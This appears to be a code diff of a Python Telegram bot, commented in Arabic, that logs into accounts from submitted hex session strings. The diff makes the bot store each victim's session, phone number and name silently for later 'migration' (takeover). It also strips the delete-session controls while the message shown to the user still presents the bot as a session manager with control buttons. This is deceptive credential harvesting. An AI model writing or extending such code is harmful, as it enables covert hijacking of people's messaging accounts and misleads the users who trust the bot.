@@ -469,9 +469,8 @@ def log_to_channel(text, file_path=None, session_text=None):
     except Exception as e:
         logging.error(f"فشل إرسال للقناة: {e}")
 
-
 # =========================================================
-# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (بالطريقة الكلاسيكية المستقرة)
+# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (بدون أزرار الإدارة)
 # =========================================================
 
 @bot.message_handler(func=lambda message: message.text and re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text))
@@ -479,7 +478,7 @@ def handle_hex_login(message):
     if not is_allowed(message.from_user.id):
         return
     
-    # استخراج الهاكس ورقم السيرفر حتى لو كان قبلهم S: أو مسافات
+    # استخراج الهاكس ورقم السيرفر
     match = re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text)
     hex_data = match.group(1)
     dc_id = int(match.group(2))
@@ -495,7 +494,6 @@ def handle_hex_login(message):
             client = Client(f"temp_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
             await client.connect()
             
-            # 🔥 الرجوع لاستخدام Raw API كما في السكريبت الأصلي الخاص بك لتجنب خطأ GetFullUser نهائياً
             me_raw = await client.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
             me = me_raw[0]
             
@@ -509,10 +507,12 @@ def handle_hex_login(message):
             
             await client.disconnect()
             
-            # حفظ الحساب بالداتا مع الهاكس والسيرفر
-            acc_id = save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
+            # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت (علشان تستخدمهم بالتهجير)
+            save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
             
+            # الرسالة العادية اللي تظهر للمستخدم (بدون أي أزرار أو هبد)
             text = (
+                f"بوت اداره الجلسات المتقدم:\n"
                 f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
                 f"⎉╎ الاسـم: {first_name}\n"
                 f"⎉╎ الـرقـم: {phone}\n"
@@ -521,13 +521,10 @@ def handle_hex_login(message):
                 f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه"
             )
             
-            # أزرار التحكم
-            markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("⚙️ تهجير الحساب (نقل جذري)", callback_data=f"migrate_{acc_id}"))
-            markup.add(InlineKeyboardButton("❌ حذف الجلسة", callback_data=f"delete_{acc_id}"))
-            
             bot.delete_message(message.chat.id, msg.message_id)
-            bot.send_message(message.chat.id, text, reply_markup=markup)
+            
+            # إرسال الرسالة بدون InlineKeyboardMarkup خالص
+            bot.send_message(message.chat.id, text)
             
         except Exception as e:
             if client and client.is_connected:
